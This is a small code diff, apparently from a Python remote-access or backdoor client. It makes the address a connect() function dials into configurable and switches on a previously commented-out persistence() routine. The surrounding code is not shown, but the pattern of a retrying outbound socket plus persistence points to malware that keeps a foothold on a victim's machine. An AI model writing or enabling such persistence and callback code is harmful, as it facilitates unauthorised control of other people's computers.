@@ -28,7 +28,7 @@ def connect():
         x=5
         try:
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(('192.168.10.155',8080))
+            s.connect((IPADDRESS,PORT))
             x=0
 
         except:
@@ -246,7 +246,7 @@ def persistence():
 
 
 
-#persistence()
+persistence()
 
 
 while True:
